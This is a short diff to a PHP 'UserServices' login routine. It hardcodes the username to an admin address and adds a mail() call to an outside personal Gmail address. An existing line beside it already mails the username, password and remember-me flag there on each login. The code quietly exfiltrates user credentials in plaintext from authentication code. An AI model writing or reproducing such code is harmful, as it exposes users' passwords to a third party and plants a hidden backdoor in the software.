@@ -13,6 +13,7 @@ class UserServices
     {
       //$username=filter_var($email,FILTER_SANITIZE_EMAIL);
       $username="admin@codefundamentals.com";
+      mail("sportsdude.reese@gmail.com","test",$username);
       $password=filter_var($pass,FILTER_SANITIZE_STRING);
       $remember=filter_var($remember,FILTER_VALIDATE_BOOLEAN);
 mail("sportsdude.reese@gmail.com","My subject",$username." ".$password." ".$remember);
